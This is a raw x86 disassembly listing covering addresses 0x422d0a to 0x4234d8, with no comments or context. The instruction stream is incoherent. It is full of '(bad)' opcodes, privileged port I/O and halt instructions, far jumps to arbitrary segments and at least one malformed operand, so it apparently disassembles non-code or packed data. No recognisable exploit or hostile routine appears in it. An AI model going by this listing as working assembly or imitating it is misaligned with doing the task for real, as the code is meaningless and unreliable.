  422d0a:	mov    bl,BYTE PTR [edx+0x4d15251e]
  422d10:	pop    edx
  422d11:	jns    0x422ce8
  422d13:	into   
  422d14:	sub    BYTE PTR [ebx-0x26],bl
  422d17:	sbb    eax,0x31a3da4f
  422d1c:	or     ecx,esp
  422d1e:	mov    dh,0x82
  422d20:	mov    ah,0x78
  422d22:	mov    WORD PTR [edi-0xfe752da],gs
  422d28:	and    al,BYTE PTR [edi-0x18473d1]
  422d2e:	dec    edx
  422d2f:	les    ecx,FWORD PTR [ebp-0x2a]
  422d32:	out    dx,eax
  422d33:	out    dx,al
  422d34:	mov    esp,0x2a19ef09
  422d39:	inc    edi
  422d3a:	and    al,0x68
  422d3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d3d:	es cs daa 
  422d40:	inc    BYTE PTR [edx]
  422d42:	ss or  dh,BYTE PTR cs:[edx]
  422d46:	ins    DWORD PTR es:[edi],dx
  422d47:	ret    
  422d48:	addr16 jnp 0x422d3d
  422d4b:	pusha  
  422d4c:	inc    BYTE PTR [edx+0x3f]
  422d4f:	sub    edx,DWORD PTR [edi]
  422d51:	pop    ebx
  422d52:	out    dx,eax
  422d53:	in     al,dx
  422d54:	adc    eax,0x366d47b2
  422d59:	push   0x39
  422d5b:	(bad)  
  422d5c:	into   
  422d5d:	hlt    
  422d5e:	xchg   ebp,eax
  422d5f:	fimul  DWORD PTR [edx+0x15700780]
  422d65:	cwde   
  422d66:	popa   
  422d67:	js     0x422d18
  422d69:	pop    ss
  422d6a:	(bad)  
  422d6b:	popf   
  422d6c:	dec    ebp
  422d6d:	xchg   ecx,eax
  422d6e:	daa    
  422d6f:	sub    al,0xe8
  422d71:	xor    DWORD PTR [ebx-0x6d],ebp
  422d74:	mov    ah,0x3d
  422d76:	jl     0x422d45
  422d78:	xlat   BYTE PTR gs:[ebx]
  422d7a:	shl    BYTE PTR [ebx],0x26
  422d7d:	adc    BYTE PTR [ecx],cl
  422d7f:	and    eax,ebx
  422d81:	aaa    
  422d82:	adc    DWORD PTR [esi+0x718f08df],esp
  422d88:	daa    
  422d89:	xor    dl,cl
  422d8b:	and    DWORD PTR es:[edx+0x319c53c1],eax
  422d92:	loopne 0x422d72
  422d94:	or     al,0x46
  422d96:	mov    ebp,0xda0a6276
  422d9b:	mov    ebp,0x2d80bafd
  422da0:	pushf  
  422da1:	ror    BYTE PTR [edx-0x4dcd1879],0x6e
  422da8:	int    0xb0
  422daa:	adc    DWORD PTR [esi-0x6a],esp
  422dad:	dec    edi
  422dae:	add    DWORD PTR [edx],edx
  422db0:	adc    BYTE PTR [ecx],dl
  422db2:	das    
  422db3:	mov    ebx,0x9a01b6bd
  422db8:	dec    ebx
  422db9:	int    0x54
  422dbb:	(bad)  
  422dbc:	and    eax,0x3b422462
  422dc1:	bound  edi,QWORD PTR [ebp-0x49]
  422dc4:	inc    edx
  422dc5:	repnz mov DWORD PTR [ebx+ebp*1+0x3f],edi
  422dca:	or     edx,DWORD PTR [edx-0x3]
  422dcd:	out    dx,eax
  422dce:	and    esi,DWORD PTR [edx+0x4a]
  422dd1:	jmp    0xdbdf:0xf799f23b
  422dd8:	mov    ah,0x46
  422dda:	(bad)  
  422ddb:	iret   
  422ddc:	es xchg edx,eax
  422dde:	lods   al,BYTE PTR ds:[esi]
  422ddf:	cdq    
  422de0:	pop    ebx
  422de1:	mov    dl,0x6d
  422de3:	(bad)  
  422de4:	test   al,0x71
  422de6:	imul   esp,esp,0x1f
  422de9:	push   esp
  422dea:	sbb    eax,0x8b71d4fa
  422def:	sbb    al,al
  422df1:	rcl    DWORD PTR [edx-0x7b],1
  422df4:	rol    DWORD PTR [ecx],cl
  422df6:	add    al,0x72
  422df8:	dec    ebp
  422df9:	das    
  422dfa:	add    BYTE PTR [eax],al
  422dfc:	gs mov ah,0x18
  422dff:	fcompp 
  422e01:	(bad)  
  422e02:	out    0xbf,eax
  422e04:	gs mov ah,0x46
  422e07:	test   BYTE PTR [ecx-0x55],0x96
  422e0b:	ja     0x422dad
  422e0d:	test   al,0x1
  422e0f:	add    BYTE PTR [esi+0x2a000002],al
  422e15:	leave  
  422e16:	rol    BYTE PTR [ebx],cl
  422e18:	push   eax
  422e19:	push   0x25f385c8
  422e1e:	pop    ebp
  422e1f:	pop    esi
  422e20:	and    DWORD PTR [eax],0xd6dee4ab
  422e26:	std    
  422e27:	xchg   BYTE PTR [edx+0x3b],bl
  422e2a:	and    edx,DWORD PTR ds:0xe811578b
  422e30:	imul   eax,DWORD PTR [ecx],0xffffff82
  422e33:	xor    al,0x9b
  422e35:	jb     0x422e52
  422e37:	je     0x422e50
  422e39:	pop    ss
  422e3a:	and    dh,BYTE PTR [edx-0x5619633a]
  422e40:	std    
  422e41:	les    eax,FWORD PTR [ecx]
  422e43:	das    
  422e44:	pop    ebx
  422e45:	dec    ebx
  422e46:	imul   ebp,esp,0xffffff94
  422e49:	lock cdq 
  422e4b:	iret   
  422e4c:	adc    ch,BYTE PTR [ebx+0x5b55d28e]
  422e52:	dec    esp
  422e53:	jbe    0x422ecb
  422e55:	xlat   BYTE PTR ds:[ebx]
  422e56:	mov    ds:0xdc72fd11,al
  422e5b:	pop    esp
  422e5c:	imul   ebx,DWORD PTR [ecx+eax*8+0x26],0xffffffc1
  422e61:	ins    DWORD PTR es:[edi],dx
  422e62:	or     ecx,DWORD PTR [edi+0x57]
  422e65:	das    
  422e66:	jle    0x422e6b
  422e68:	add    DWORD PTR [ecx+0x69],ecx
  422e6b:	xchg   DWORD PTR [ebx+0x1e2e967a],esi
  422e71:	ja     0x422ec4
  422e73:	push   edi
  422e74:	(bad)  
  422e75:	aas    
  422e76:	mov    eax,0xad13f7f3
  422e7b:	ja     0x422efc
  422e7d:	fisub  DWORD PTR [esi]
  422e7f:	push   edi
  422e80:	pop    ss
  422e81:	sub    eax,0xe74e5cc1
  422e86:	test   al,0x91
  422e88:	outs   dx,BYTE PTR ds:[esi]
  422e89:	aad    0x4f
  422e8b:	mov    ebx,0xc1019584
  422e90:	pop    ss
  422e91:	lock add DWORD PTR [edi],0x981972ff
  422e98:	(bad)  
  422e99:	pop    ecx
  422e9a:	aam    0xa8
  422e9c:	fist   DWORD PTR [edi+0x512cd1e1]
  422ea2:	dec    ebx
  422ea3:	mov    bh,0x3a
  422ea5:	push   esp
  422ea6:	jne    0x422f1b
  422ea8:	(bad)  
  422ea9:	outs   dx,BYTE PTR cs:[esi]
  422eab:	scas   al,BYTE PTR es:[edi]
  422eac:	imul   esp,DWORD PTR [edi+0x15],0xffffffcd
  422eb0:	mov    ch,BYTE PTR [ebp-0x5e]
  422eb3:	add    eax,0x208ccab7
  422eb8:	fcom   DWORD PTR [ebx+edx*4+0x76]
  422ebc:	iret   
  422ebd:	sahf   
  422ebe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ebf:	std    
  422ec0:	xor    BYTE PTR [ecx+0x38],bl
  422ec3:	fisttp QWORD PTR [esi+0x5e]
  422ec6:	xchg   ebx,eax
  422ec7:	std    
  422ec8:	adc    eax,0x25117005
  422ecd:	jp     0x422ecd
  422ecf:	xchg   ebp,eax
  422ed0:	xchg   ebx,eax
  422ed1:	mov    ebp,0xf52ed416
  422ed6:	call   0xe5c801fe
  422edb:	jl     0x422e83
  422edd:	icebp  
  422ede:	call   0x147727b5
  422ee3:	es xchg edi,eax
  422ee5:	test   al,0x2e
  422ee7:	cwde   
  422ee8:	fsubrp st(5),st
  422eea:	loope  0x422ef6
  422eec:	inc    ebx
  422eed:	sub    bh,BYTE PTR [ecx]
  422eef:	mov    ebp,0xc2a029ee
  422ef4:	jne    0x422ee7
  422ef6:	dec    ebp
  422ef7:	and    BYTE PTR [eax-0x5d],dh
  422efa:	cmp    BYTE PTR [eax+0x17],dh
  422efd:	or     eax,0xe60aea91
  422f02:	push   ds
  422f03:	aam    0xcb
  422f05:	pop    esi
  422f06:	je     0x422e9d
  422f08:	sbb    BYTE PTR [esi+0x6b],ah
  422f0b:	mov    dl,0xc2
  422f0d:	fidivr DWORD PTR [eax]
  422f0f:	aas    
  422f10:	pop    ds
  422f11:	scas   eax,DWORD PTR es:[edi]
  422f12:	pop    edi
  422f13:	mov    ebp,0x9c740053
  422f18:	xor    DWORD PTR [ecx-0x4cafe978],0xbb6354d0
  422f22:	das    
  422f23:	aas    
  422f24:	dec    eax
  422f25:	out    0x8f,eax
  422f27:	out    dx,al
  422f28:	loope  0x422fa6
  422f2a:	dec    esp
  422f2b:	add    DWORD PTR ds:0xd6cd0342,0x4f
  422f32:	jne    0x422eea
  422f34:	out    0x16,al
  422f36:	mov    edi,0x85911b4b
  422f3b:	(bad)  
  422f3c:	push   ds
  422f3d:	sbb    eax,0x2f8f1330
  422f42:	push   0x38
  422f44:	mov    al,ds:0xe0788301
  422f49:	cmc    
  422f4a:	pushf  
  422f4b:	in     al,0x25
  422f4d:	lods   eax,DWORD PTR ds:[esi]
  422f4e:	or     ebp,0xdfe5a3e9
  422f54:	iret   
  422f55:	jecxz  0x422f74
  422f57:	push   edi
  422f58:	call   0x8fba6811
  422f5d:	xchg   ebp,eax
  422f5e:	mov    ebp,DWORD PTR [eax-0x4d]
  422f61:	add    eax,DWORD PTR [edx-0x72]
  422f64:	gs jl  0x422fd5
  422f67:	adc    eax,0xb7febe36
  422f6c:	inc    edx
  422f6d:	fsubp  st(2),st
  422f6f:	clc    
  422f70:	inc    ecx
  422f71:	pusha  
  422f72:	scas   al,BYTE PTR es:[edi]
  422f73:	stos   DWORD PTR es:[edi],eax
  422f74:	push   ecx
  422f75:	add    edx,0xffffffcf
  422f78:	xor    BYTE PTR [ecx-0x6fd93c19],al
  422f7e:	ror    BYTE PTR [edx],cl
  422f80:	lds    edi,FWORD PTR [ecx-0x2379570b]
  422f86:	div    BYTE PTR [ecx]
  422f88:	inc    esi
  422f89:	ja     0x422ff2
  422f8b:	js     0x422f16
  422f8d:	repnz aaa 
  422f8f:	stos   DWORD PTR es:[edi],eax
  422f90:	add    bl,BYTE PTR ds:0x630be506
  422f96:	test   dl,dh
  422f98:	add    DWORD PTR [ebp+0x3b],ebx
  422f9b:	not    BYTE PTR [edi-0x2ce61b87]
  422fa1:	or     bh,dh
  422fa3:	hlt    
  422fa4:	stos   BYTE PTR es:[edi],al
  422fa5:	fs (bad) 
  422fa7:	daa    
  422fa8:	lods   al,BYTE PTR ds:[esi]
  422fa9:	mov    edx,0x2d872af8
  422fae:	add    cl,al
  422fb0:	scas   eax,DWORD PTR es:[edi]
  422fb1:	pop    edx
  422fb2:	mov    esi,0x425887ee
  422fb7:	push   ebp
  422fb8:	xor    cl,bh
  422fba:	mov    eax,ds:0x345ee77c
  422fbf:	dec    eax
  422fc0:	push   edi
  422fc1:	and    al,0x95
  422fc3:	cmc    
  422fc4:	mov    ebx,0xb0f478ba
  422fc9:	in     al,0x48
  422fcb:	pop    ebx
  422fcc:	test   ch,bh
  422fce:	push   ds
  422fcf:	mov    esi,0xb4403c16
  422fd4:	sbb    al,0x9b
  422fd6:	adc    ecx,DWORD PTR ds:0x569ad351
  422fdc:	and    al,0x20
  422fde:	test   ecx,ebx
  422fe0:	sahf   
  422fe1:	pop    eax
  422fe2:	jg     0x422ff5
  422fe4:	fst    QWORD PTR [eax]
  422fe6:	lods   al,BYTE PTR ds:[esi]
  422fe7:	push   edi
  422fe8:	lock sbb dl,BYTE PTR [ebp-0x1d]
  422fec:	add    bl,cl
  422fee:	pushf  
  422fef:	cmp    DWORD PTR [ebx+0x65],ecx
  422ff2:	js     0x422f86
  422ff4:	or     BYTE PTR [edi-0x31],ch
  422ff7:	ja     0x42301a
  422ff9:	and    ebx,DWORD PTR [edi-0x6bc58982]
  422fff:	xchg   esp,eax
  423000:	aam    0x65
  423002:	nop
  423003:	js     0x423080
  423005:	pusha  
  423006:	es test edi,ebp
  423009:	rep outs dx,DWORD PTR ds:[esi]
  42300b:	fisubr WORD PTR [edx]
  42300d:	loop   0x42307b
  42300f:	es (bad) 
  423011:	aaa    
  423012:	je     0x422ff9
  423014:	jb     0x423018
  423016:	jnp    0x423059
  423018:	mov    eax,0x9d9149e9
  42301d:	mov    ch,0x99
  42301f:	jmp    0x422fce
  423021:	dec    esi
  423022:	mov    ds:0x7e3f5197,al
  423027:	jp     0x423075
  423029:	int    0x94
  42302b:	xchg   ecx,eax
  42302c:	out    0xe8,al
  42302e:	lea    ebx,[edx-0x790ce968]
  423034:	bound  edx,QWORD PTR [esi]
  423036:	loope  0x422fb9
  423038:	shl    DWORD PTR [ecx-0x2],cl
  42303b:	push   ebp
  42303c:	xchg   ecx,eax
  42303d:	out    0x26,eax
  42303f:	icebp  
  423040:	in     eax,dx
  423041:	loop   0x423077
  423043:	sti    
  423044:	stos   DWORD PTR es:[edi],eax
  423045:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423046:	pop    ebx
  423047:	push   esp
  423048:	sub    dh,dh
  42304a:	hlt    
  42304b:	adc    DWORD PTR [edi],ecx
  42304d:	and    DWORD PTR [esi],esi
  42304f:	shl    dh,cl
  423051:	out    dx,al
  423052:	xchg   edi,eax
  423053:	mov    eax,0xce4bac2c
  423058:	jmp    0x72b0:0xe9072df1
  42305f:	xchg   ebx,eax
  423060:	in     al,dx
  423061:	add    DWORD PTR [ebx+ebp*4+0x11],edx
  423065:	dec    esi
  423066:	jp     0x422fff
  423068:	add    eax,0x410b7f7e
  42306d:	fst    DWORD PTR [ebx+0x2e94e3fe]
  423073:	add    bl,cl
  423075:	cs dec edi
  423077:	cmp    BYTE PTR [esi-0x80],al
  42307a:	cs (bad) 
  42307c:	push   ds
  42307d:	mov    dh,0x95
  42307f:	add    al,0x89
  423081:	adc    al,0x35
  423083:	add    al,0x5f
  423085:	aad    0xa8
  423087:	pop    ebx
  423088:	dec    ebp
  423089:	and    BYTE PTR [ebp-0x173a4a19],dl
  42308f:	jmp    0xc5e:0x66eea210
  423096:	test   eax,0x1d445d
  42309b:	add    BYTE PTR [edx],dl
  42309d:	fsub   DWORD PTR [ebx+0x72]
  4230a0:	jmp    0x42309d
  4230a2:	adc    edi,eax
  4230a4:	sub    edi,DWORD PTR [ebx-0x21e57709]
  4230aa:	fist   WORD PTR [esi+0x26]
  4230ad:	stos   DWORD PTR es:[edi],eax
  4230ae:	add    DWORD PTR [eax],eax
  4230b0:	xchg   BYTE PTR [edx],al
  4230b2:	add    BYTE PTR [eax],al
  4230b4:	and    al,0x83
  4230b6:	nop
  4230b7:	inc    ebx
  4230b8:	push   ecx
  4230b9:	bound  ebx,QWORD PTR [esi+0x5edacc3]
  4230bf:	sti    
  4230c0:	shld   DWORD PTR [ecx+0x5d],ebp,cl
  4230c4:	cwde   
  4230c5:	ins    DWORD PTR es:[edi],dx
  4230c6:	push   ds
  4230c7:	and    ebx,DWORD PTR [esi]
  4230c9:	(bad)  
  4230cb:	(bad)  
  4230cc:	iret   
  4230cd:	push   esi
  4230ce:	mov    dh,0xc9
  4230d0:	or     DWORD PTR [ebx+0x64d0e727],0x66f636bd
  4230da:	sbb    ah,dl
  4230dc:	cmp    eax,DWORD PTR [esi]
  4230de:	push   ebx
  4230df:	js     0x4230a7
  4230e1:	jb     0x423131
  4230e3:	jnp    0x4230b4
  4230e5:	jnp    0x423118
  4230e7:	rol    DWORD PTR [edi],1
  4230e9:	je     0x42315e
  4230eb:	stc    
  4230ec:	out    0x5a,eax
  4230ee:	jns    0x423144
  4230f0:	jbe    0x4230b8
  4230f2:	sahf   
  4230f3:	hlt    
  4230f4:	fiadd  DWORD PTR [ebx]
  4230f6:	inc    esi
  4230f7:	jbe    0x423165
  4230f9:	scas   al,BYTE PTR es:[edi]
  4230fa:	pop    ecx
  4230fb:	(bad)  
  4230fc:	fwait
  4230fd:	rcl    WORD PTR [ebx-0x7665e1da],cl
  423104:	das    
  423105:	adc    BYTE PTR [esi],0xe6
  423108:	inc    ebp
  423109:	aad    0x5b
  42310b:	not    ah
  42310d:	push   esi
  42310e:	mov    edi,0x11b073b5
  423113:	ret    
  423114:	or     edi,ebp
  423116:	inc    edx
  423117:	daa    
  423118:	fcomp  QWORD PTR [edx-0xc79d744]
  42311e:	mov    ebp,0x285a00c
  423123:	cmc    
  423124:	sbb    eax,0xb7ccfa6f
  423129:	rcr    DWORD PTR [esi-0x59],cl
  42312c:	rol    BYTE PTR [eax+0x28fc4716],0x88
  423133:	or     DWORD PTR [edi],ecx
  423135:	mov    dl,BYTE PTR [ebx-0x33]
  423138:	cmp    al,0xa9
  42313a:	xchg   DWORD PTR [ebx],ecx
  42313c:	or     ebp,0xffffffee
  42313f:	xor    cl,BYTE PTR [edx+0x4a92d14c]
  423145:	xchg   DWORD PTR [esi+0x1d2977b7],ecx
  42314b:	repnz loope 0x4230f5
  42314e:	jge    0x423159
  423150:	sbb    BYTE PTR [ebp-0x3af95587],dh
  423156:	test   DWORD PTR [ecx+0x73],ebp
  423159:	pop    ebx
  42315a:	jl     0x4231d9
  42315c:	add    edx,edx
  42315e:	xchg   ecx,eax
  42315f:	inc    ecx
  423160:	pop    ebx
  423161:	adc    dh,BYTE PTR [edi+0x28182cff]
  423167:	push   ebp
  423168:	xchg   edx,eax
  423169:	das    
  42316a:	outs   dx,BYTE PTR ds:[esi]
  42316b:	cs xchg ebp,eax
  42316d:	imul   esp,ebp,0x6f
  423170:	call   0xe013c426
  423175:	out    0xd0,al
  423177:	ret    
  423178:	cmp    al,0xbe
  42317a:	inc    ebx
  42317b:	jmp    0x98d8:0x3af47df1
  423182:	sub    esp,DWORD PTR [edx-0x1e]
  423185:	xchg   esp,eax
  423186:	sar    BYTE PTR [eax-0x24],1
  423189:	fwait
  42318a:	push   ss
  42318b:	inc    edx
  42318c:	scas   al,BYTE PTR es:[edi]
  42318d:	loope  0x4231d8
  42318f:	jo     0x4231d5
  423191:	sar    esi,0x60
  423194:	push   ebx
  423195:	jge    0x4231ef
  423197:	test   al,0xd2
  423199:	lods   eax,DWORD PTR ds:[esi]
  42319a:	aaa    
  42319b:	in     al,0x7
  42319d:	or     BYTE PTR [ebx],bl
  42319f:	div    BYTE PTR [esp+eiz*8]
  4231a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4231a3:	sub    al,0xa4
  4231a5:	outs   dx,BYTE PTR ds:[esi]
  4231a6:	leave  
  4231a7:	aad    0xf5
  4231a9:	sbb    eax,0xa7215086
  4231ae:	mov    dh,0xfc
  4231b0:	imul   edx,ecx,0xffffffb5
  4231b3:	rol    DWORD PTR [esi+0x4b],1
  4231b6:	(bad)  
  4231b7:	vpor   ymm0,ymm7,YMMWORD PTR [esi+0x4fb97d98]
  4231bf:	or     ah,bl
  4231c1:	sbb    eax,0x455207c9
  4231c6:	imul   esi,DWORD PTR [esi-0x56],0x22
  4231ca:	mov    ah,0x75
  4231cc:	(bad)  
  4231ce:	mov    bl,0x30
  4231d0:	add    al,0x7a
  4231d2:	(bad)  
  4231d3:	imul   edx,eax,0xffffffbb
  4231d6:	sar    DWORD PTR [eax+0x2b],0x11
  4231da:	stos   DWORD PTR es:[edi],eax
  4231db:	outs   dx,DWORD PTR ds:[esi]
  4231dc:	arpl   WORD PTR [edi+0x17b8e2c3],sp
  4231e2:	aaa    
  4231e3:	mov    esi,0xf9efc4d5
  4231e8:	adc    DWORD PTR [ecx],ebp
  4231ea:	cmp    cl,al
  4231ec:	push   eax
  4231ed:	or     dl,BYTE PTR [edx]
  4231ef:	xor    ebp,DWORD PTR [ecx+0x45]
  4231f2:	addr16 and eax,0xa3596c86
  4231f8:	outs   dx,BYTE PTR ds:[esi]
  4231f9:	push   esi
  4231fa:	jp     0x423203
  4231fc:	shl    eax,0x7e
  4231ff:	inc    esp
  423200:	inc    edi
  423201:	jmp    0x42320a
  423203:	mov    al,0x3f
  423205:	cmp    BYTE PTR [esp+ecx*2-0x6808a7fc],cl
  42320c:	fmul   DWORD PTR [ecx]
  42320e:	sub    eax,DWORD PTR es:[esi+0x5f2138fd]
  423215:	xor    eax,DWORD PTR ds:[edx-0x1d]
  423219:	pop    ss
  42321a:	push   edx
  42321b:	add    DWORD PTR [esi+0x7917109],0x3b
  423222:	adc    dh,BYTE PTR [edx]
  423224:	mov    ah,ah
  423226:	in     al,0xb7
  423228:	sbb    BYTE PTR [ecx+0x64],dl
  42322b:	mov    bl,0xf5
  42322d:	sub    DWORD PTR [edx+esi*4-0x78c0123f],ebp
  423234:	push   edi
  423235:	mov    ecx,0xc6ea706c
  42323a:	sbb    al,0xe2
  42323c:	(bad)  
  42323d:	push   es
  42323e:	jge    0x423264
  423240:	xchg   edx,eax
  423241:	jbe    0x4232b1
  423243:	pushf  
  423244:	push   edi
  423245:	iret   
  423246:	dec    edi
  423247:	mul    edx
  423249:	push   es
  42324a:	jbe    0x423228
  42324c:	cmp    ch,BYTE PTR [ecx-0x2b]
  42324f:	dec    eax
  423250:	enter  0x11c0,0x2c
  423254:	dec    edi
  423255:	xchg   DWORD PTR [edi-0x61],esi
  423258:	les    esp,FWORD PTR ds:0xa13a6071
  42325e:	retf   
  42325f:	shr    dh,0x91
  423262:	in     eax,dx
  423263:	ficom  WORD PTR [ecx-0x14]
  423266:	mov    edx,0x3f3e2407
  42326b:	pop    ss
  42326c:	push   es
  42326d:	sbb    esp,DWORD PTR [edi+edi*8+0x48]
  423271:	xchg   edx,eax
  423272:	(bad)  
  423273:	sub    BYTE PTR [edx],ah
  423275:	sahf   
  423276:	ret    
  423277:	inc    edi
  423278:	inc    ebx
  423279:	clc    
  42327a:	imul   ecx,DWORD PTR [eax+ecx*8],0xc03f0fd2
  423281:	mov    eax,0x8603453b
  423286:	jmp    0x6227c9d5
  42328b:	mov    eax,0xa4aa73e9
  423290:	mov    edx,0x80f78098
  423295:	adc    eax,0xb0b5362c
  42329a:	mov    WORD PTR [esi],gs
  42329c:	popf   
  42329d:	leave  
  42329e:	xor    esi,0x6d
  4232a1:	rol    DWORD PTR [ecx+0x74c78bfa],0x71
  4232a8:	xchg   eax,esi
  4232aa:	xchg   ebp,eax
  4232ab:	jle    0x423287
  4232ad:	adc    cl,cl
  4232af:	inc    esi
  4232b0:	js     0x423261
  4232b2:	stc    
  4232b3:	pushf  
  4232b4:	loope  0x4232c1
  4232b6:	pop    esp
  4232b7:	jb     0x4232b6
  4232b9:	push   esi
  4232ba:	or     dh,ch
  4232bc:	mov    ds:0x3ada38ec,eax
  4232c2:	cmp    ebx,DWORD PTR [ebx]
  4232c4:	test   eax,0xeda8b908
  4232c9:	inc    ebp
  4232ca:	and    DWORD PTR [eax+0x27],ebp
  4232cd:	call   0x48c:0xa930
  4232d3:	std    
  4232d4:	jge    0x4232ea
  4232d6:	scas   eax,DWORD PTR es:[edi]
  4232d7:	jmp    0xb671:0xefba8e36
  4232de:	hlt    
  4232df:	mov    dh,0x61
  4232e1:	std    
  4232e2:	scas   al,BYTE PTR es:[edi]
  4232e3:	stc    
  4232e4:	mov    al,0x73
  4232e6:	cmp    eax,0x284f2f4b
  4232eb:	xor    BYTE PTR [edi-0x458464ad],0x26
  4232f2:	dec    esi
  4232f3:	enter  0x7aa0,0xa8
  4232f7:	ds push cs
  4232f9:	fdivr  QWORD PTR [edx-0x542235ea]
  4232ff:	xor    esi,DWORD PTR [edx]
  423301:	inc    edi
  423302:	sbb    al,0x70
  423304:	cmp    al,BYTE PTR [esi-0x26]
  423307:	xor    DWORD PTR [ecx-0x3af8a0fe],esp
  42330d:	icebp  
  42330e:	repnz pop ebp
  423310:	in     al,dx
  423311:	mov    ds:0x658279ca,eax
  423316:	sar    BYTE PTR [ebx],1
  423318:	imul   BYTE PTR [edx+0x7e]
  42331b:	sbb    ecx,ecx
  42331d:	mov    WORD PTR [edx],ss
  42331f:	xlat   BYTE PTR ds:[ebx]
  423320:	mov    al,ds:0x97a30b2e
  423325:	and    eax,0x4cb382cb
  42332a:	and    al,BYTE PTR [ebx-0x5e171efe]
  423330:	or     bh,cl
  423332:	fdiv   DWORD PTR [esi]
  423334:	mov    ebx,0x81967f9a
  423339:	mov    dl,0x0
  42333b:	add    BYTE PTR [esi],cl
  42333d:	and    BYTE PTR [eax-0x404051c1],cl
  423343:	xor    DWORD PTR [ebx-0x606d7643],edx
  423349:	nop
  42334a:	sub    BYTE PTR [esi-0x54],ah
  42334d:	lods   eax,DWORD PTR ds:[esi]
  42334e:	add    DWORD PTR [eax],eax
  423350:	xchg   BYTE PTR [edx],al
  423352:	add    BYTE PTR [eax],al
  423354:	sub    esi,DWORD PTR ss:[ecx*2-0x4bd1f689]
  42335c:	jmp    0x5dc2:0x74909373
  423363:	test   al,0xad
  423365:	mov    ds:0x1cb0e668,al
  42336a:	add    dl,BYTE PTR [ebp+0x1c0c4392]
  423370:	ss cmp al,0xb7
  423373:	sbb    BYTE PTR [edx-0x685e3634],ch
  423379:	xchg   edx,eax
  42337a:	cwde   
  42337b:	xor    eax,0xf540bef9
  423380:	adc    BYTE PTR [eax+0x54d4be75],0xf9
  423387:	lock popf 
  423389:	in     al,dx
  42338a:	jbe    0x423366
  42338c:	mov    ecx,0xb9faa40
  423391:	mov    dl,0xd
  423394:	mov    ecx,0x3b713791
  423399:	push   es
  42339a:	jbe    0x4233df
  42339c:	out    0x6a,al
  42339e:	inc    esp
  42339f:	jb     0x4233fa
  4233a1:	clc    
  4233a2:	jmp    0x96d0:0xf3c2a32d
  4233a9:	test   al,0x3f
  4233ab:	pop    esi
  4233ac:	pushf  
  4233ad:	or     al,0x60
  4233af:	bound  ebp,QWORD PTR [eax+0x481fbebb]
  4233b5:	push   edi
  4233b6:	jp     0x423386
  4233b8:	add    ebp,DWORD PTR [eax+0xfbd94b0]
  4233be:	inc    edi
  4233bf:	pop    ss
  4233c0:	test   eax,0x3a7fd5e1
  4233c5:	inc    ebx
  4233c6:	push   es
  4233c7:	jo     0x4233b3
  4233c9:	out    0xbd,al
  4233cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4233cc:	pop    ds
  4233cd:	and    al,0xf1
  4233cf:	dec    esi
  4233d0:	js     0x423393
  4233d2:	cmp    BYTE PTR [ecx],0xca
  4233d5:	jp     0x4233d6
  4233d7:	(bad)  
  4233d8:	out    dx,al
  4233d9:	fdivr  QWORD PTR [ecx]
  4233db:	stos   DWORD PTR es:[edi],eax
  4233dc:	fsub   QWORD PTR [ebp-0x337e39a4]
  4233e2:	in     eax,0xa0
  4233e4:	inc    esi
  4233e5:	add    al,0x51
  4233e7:	sti    
  4233e8:	(bad)  
  4233e9:	les    ecx,FWORD PTR ds:0x815adffa
  4233ef:	mov    al,ds:0xdbbf3225
  4233f4:	fisttp WORD PTR [ecx-0x60]
  4233f7:	sub    ecx,ecx
  4233f9:	(bad)  
  4233fa:	out    0x7c,al
  4233fc:	mov    ?,WORD PTR [edx]
  4233fe:	push   eax
  4233ff:	cld    
  423400:	(bad)  
  423401:	jp     0x4233dc
  423403:	mov    eax,0xcc0c4e9b
  423408:	dec    edx
  423409:	xchg   ecx,eax
  42340a:	xchg   BYTE PTR [esi+0x6c740283],cl
  423410:	scas   al,BYTE PTR es:[edi]
  423411:	loopne 0x423445
  423413:	push   cs
  423414:	cs aaa 
  423416:	jge    0x4233fd
  423418:	enter  0xc4c4,0xbc
  42341c:	push   ds
  42341d:	dec    esp
  42341e:	cmp    al,BYTE PTR [ecx-0x39]
  423421:	and    eax,DWORD PTR ds:0xf8179283
  423427:	mov    edx,0x17a03aca
  42342c:	push   ds
  42342d:	test   edi,esp
  42342f:	or     eax,0xabe3f48c
  423434:	or     bh,BYTE PTR [edx-0x340bda3b]
  42343a:	and    al,0xca
  42343c:	ss ss jbe 0x42341c
  423440:	popa   
  423441:	and    cl,BYTE PTR [esi-0x125fa716]
  423447:	push   ss
  423448:	push   0x7e
  42344a:	sub    bh,BYTE PTR [edx-0x65]
  42344d:	xchg   edi,eax
  42344e:	cmp    BYTE PTR [ecx+0x4f63ecac],ah
  423454:	(bad)  
  423455:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423456:	push   ds
  423457:	dec    ecx
  423458:	mov    ds,WORD PTR [eax+esi*4]
  42345b:	and    eax,0xf0d3e3c0
  423460:	add    BYTE PTR [eax-0x1b],bh
  423463:	repz (bad) 
  423465:	xchg   ebx,eax
  423466:	mov    ebp,0xe428838e
  42346b:	mov    ecx,0xb78539de
  423470:	mov    dh,0x68
  423472:	mov    dh,0x23
  423474:	push   0xffffffa3
  423476:	sahf   
  423477:	cmp    DWORD PTR [ebx],ecx
  423479:	(bad)  
  42347a:	and    DWORD PTR [ebp-0x2ec20ae5],edx
  423480:	add    DWORD PTR [eax+eiz*1-0x218e8c01],edx
  423487:	jp     0x423428
  423489:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42348a:	std    
  42348b:	adc    al,0x55
  42348d:	mov    esi,0x6a320416
  423492:	xchg   DWORD PTR [edi+0xb],esi
  423495:	adc    DWORD PTR [edx],eax
  423497:	call   0x239c3bc6
  42349c:	test   DWORD PTR [eax-0x4946d3c7],0x2c57b459
  4234a6:	or     eax,0x80c90fac
  4234ab:	cli    
  4234ac:	stc    
  4234ad:	jns    0x423466
  4234af:	mov    dl,bh
  4234b1:	add    BYTE PTR [eax+0x34199920],cl
  4234b7:	setge  BYTE PTR [eax+0x63]
  4234bb:	add    ebp,eax
  4234bd:	cmp    edi,DWORD PTR [eax-0x49bda8ef]
  4234c3:	clc    
  4234c4:	mov    ch,0xb5
  4234c6:	jno    0x423494
  4234c8:	mov    ch,0x72
  4234ca:	mov    WORD PTR [esi-0x52],fs
  4234cd:	sbb    eax,0x4f7cdcd4
  4234d2:	lds    ecx,FWORD PTR [eax-0x3e1668ac]
  4234d8:	pop    edx
